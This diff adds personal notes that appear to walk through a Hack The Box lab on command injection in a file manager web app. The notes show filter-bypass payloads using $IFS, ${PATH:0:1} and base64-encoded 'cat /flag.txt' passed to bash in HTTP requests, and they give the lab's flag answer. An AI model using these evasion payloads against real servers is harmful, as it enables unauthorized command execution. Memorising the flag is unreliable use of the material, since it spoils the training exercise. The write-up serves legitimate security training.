@@ -1,1 +1,53 @@
+You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.
 
+Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.
+
+
+
+
+CHALLENGE: 94.237.59.30:59199
+
+Question 1 - What is the content of '/flag.txt'? 
+1. 94.237.59.30:59199
+2. log in with guest:guest
+3. play around with 4 features of 'preview, copy to.. , direct link, download' 
+4. copy to is probably our best way to manipulate anything. 
+5. copy to temp seems to work, lets check move  to tmp.
+6. Error while moving: mv: '/var/www/html/files/51459716.txt' and '/var/www/html/files/51459716.txt' are the same file
+7. i think we found out our attack vector 
+8. copy to -> enable burp on browser -> move to -> capture request 
+9. send to repeater -> hit send -> response -> around line 733 on response -> 
+Error while moving: mv: '/var/www/html/files/51459716.txt' and '/var/www/html/files/51459716.txt' are the same file
+10. so if we tried to add whoami on the GET request amd send that ol boy through lets see what happens -> GET /index.php?to=||whoami&from=||51459716.txt&finish=1&move=1 HTTP/1.1
+11. now on line 733 we see -> <p class="message alert">Malicious request denied!</p> 
+12. now if we try the & operator lets see what we get -> GET /index.php?to=&whoami&from=&51459716.txt&finish=1&move=1 HTTP/1.1
+13 Response : HTTP/1.1 302 Found
+Date: Thu, 20 Mar 2025 17:15:28 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Location: http://94.237.59.30:59199/index.php?to=
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+14. so its a redirect and it passes by, as the developers may have thought that it is required for URLs, and thus whitelisted it
+15. however, it must be URL encoded, i.e., %26. so we need to determine which parameter to be used for the injections, and in this case, either can be used, since both constitute the command being run by the backend, as seen by the printed error previously.
+16. we need to inject & cat /flag.txt to read the flag file; to bypass white-space, we can either use $IFS or %09, and to bypass slashes, use ${PATH:0:1}, 
+therefore, the payload can either be $IFS%26c"a"t$IFS${PATH:0:1}flag.txt, or $IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==).
+17. so REQUEST looks like: 
+GET /index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=51459716.txt&finish=1&move=1 HTTP/1.1
+Host: 83.136.249.46:55989
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.249.46:55989/index.php?to=&from=51459716.txt
+DNT: 1
+Connection: keep-alive
+Cookie: filemanager=d4p04c6a364183edj31i2v0a9j
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+18. Response page on line 733: 
+<p class="message alert">Error while moving: HTB{c0mm4nd3r_1nj3c70r}
